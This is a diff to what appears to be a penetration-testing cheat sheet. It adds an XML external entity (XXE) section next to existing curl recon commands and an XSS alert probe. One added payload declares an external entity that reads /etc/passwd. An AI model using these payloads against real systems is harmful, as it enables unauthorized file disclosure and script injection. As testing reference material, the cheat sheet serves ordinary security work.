@@ -42,6 +42,25 @@ curl <hostname> -I                                                              
 curl <hostname> -v                                                                 # Verbose mode with header
 curl http://site.com/images/favico.ico | md5sum                                    # Get hash of the favicon site and when chek it on the OWASP DB (see 1 note)
 
+#######################         XXE          #######################################
+
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+
+
+
+
+
+
+
 #######################         XSS          #######################################
 
 <script>alert('XSS');</script>                                                     # XSS Check
